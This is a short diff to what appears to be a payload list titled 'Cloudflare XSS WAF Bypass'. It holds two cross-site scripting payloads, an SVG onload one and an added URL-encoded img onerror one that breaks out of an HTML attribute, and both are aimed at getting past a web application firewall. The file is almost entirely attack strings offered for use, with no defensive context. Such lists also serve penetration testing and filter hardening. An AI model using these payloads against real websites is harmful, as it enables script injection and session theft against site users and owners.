@@ -1,3 +1,4 @@
 Cloudflare XSS WAF Bypass 
 
 <svg onx=() onload=(confirm)(1)>
+1%22%3e%20%3cimg%20src%3da%20onerror%3dalert("XSS")%3e<!--
